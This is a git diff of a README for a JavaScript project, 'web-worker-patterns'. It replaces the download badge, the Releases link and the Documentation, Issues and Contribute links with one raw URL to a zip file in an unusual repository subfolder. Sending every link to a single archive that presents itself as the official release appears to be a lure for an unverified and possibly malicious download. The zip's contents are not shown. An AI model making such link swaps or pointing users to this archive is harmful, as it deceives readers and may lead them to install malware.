@@ -1,6 +1,6 @@
 # 🌐 web-worker-patterns - Explore Efficient JavaScript Techniques
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Glencee26/web-worker-patterns/releases)
+[![Download](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To get started, you'll need to download the application from the Releases page. 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** To download the software, go to our Releases page by clicking the link below:
-   [Download from Releases](https://github.com/Glencee26/web-worker-patterns/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)
 
 2. **Choose Your Version:** You'll find a list of available versions. Look for the most recent version, which will typically be at the top of the list.
 
@@ -58,8 +58,8 @@ This project is licensed under the MIT License. You can use and modify the code 
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/Glencee26/web-worker-patterns/wiki)
-- [Issues](https://github.com/Glencee26/web-worker-patterns/issues)
-- [Contribute](https://github.com/Glencee26/web-worker-patterns/blob/main/CONTRIBUTING.md)
+- [Documentation](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)
+- [Issues](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)
+- [Contribute](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)
 
 Thank you for using **web-worker-patterns**! We hope you find the patterns helpful in your web development journey.
